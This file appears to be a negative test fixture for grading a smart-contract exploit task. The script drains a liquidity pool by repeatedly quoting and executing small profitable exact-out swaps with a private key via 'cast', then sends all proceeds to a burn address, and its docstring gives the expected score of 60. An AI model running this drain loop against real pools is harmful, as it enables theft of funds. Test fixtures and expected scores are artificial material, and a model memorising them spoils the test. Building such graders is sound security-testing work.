#!/usr/bin/env python3
"""Broken fixture: run the real drain, then send all proceeds to a burn
address instead of keeping them.

Expected: pool_drained passes, profit_captured fails. Score 60.
"""
import json
import subprocess
from pathlib import Path

BURN = "0x000000000000000000000000000000000000dEaD"


def cast(*a):
    r = subprocess.run(["cast", *a], capture_output=True, text=True, timeout=120)
    return r.stdout.strip().split()[0] if r.returncode == 0 else None


def main():
    p = json.loads(Path("params.json").read_text())
    rpc, pool = p["rpc_url"], p["pool"]
    key = Path(p["key_file"]).read_text().strip()
    fX = int(cast("call", "--rpc-url", rpc, pool, "fX()(uint256)"))
    fY = int(cast("call", "--rpc-url", rpc, pool, "fY()(uint256)"))
    init_true = int(cast("call", "--rpc-url", rpc, pool, "trueValue()(uint256)"))
    maxu = cast("max-uint")
    for tok in (p["tokenX"], p["tokenY"]):
        subprocess.run(["cast", "send", "--rpc-url", rpc, "--private-key", key,
                        tok, "approve(address,uint256)", pool, maxu], capture_output=True, text=True)

    def sim(o, amt):
        r = subprocess.run(["cast", "call", "--rpc-url", rpc, pool,
                            "quoteExactOut(bool,uint256)(uint256,bool)", "true" if o else "false", str(amt)],
                           capture_output=True, text=True)
        if r.returncode != 0:
            return None
        pr = r.stdout.split()
        inA, ok = int(pr[0]), pr[1] == "true"
        if not ok or inA == 0:
            return None
        return amt * (fY if o else fX) - inA * (fX if o else fY)

    for _ in range(200):
        if int(cast("call", "--rpc-url", rpc, pool, "trueValue()(uint256)")) <= init_true // 5:
            break
        best = None
        for o in (True, False):
            for amt in range(1, 13):
                g = sim(o, amt)
                if g is not None and g > 0 and (best is None or g > best[0]):
                    best = (g, o, amt)
        if best is None:
            break
        subprocess.run(["cast", "send", "--rpc-url", rpc, "--private-key", key, pool,
                        "swapExactOut(bool,uint256)", "true" if best[1] else "false", str(best[2])],
                       capture_output=True, text=True)

    # burn everything we hold so profit isn't captured
    me = cast("wallet", "address", "--private-key", key)
    for tok in (p["tokenX"], p["tokenY"]):
        bal = cast("call", "--rpc-url", rpc, tok, "balanceOf(address)(uint256)", me)
        subprocess.run(["cast", "send", "--rpc-url", rpc, "--private-key", key, tok,
                        "transfer(address,uint256)", BURN, bal], capture_output=True, text=True)
    print("drained then burned")


if __name__ == "__main__":
    main()
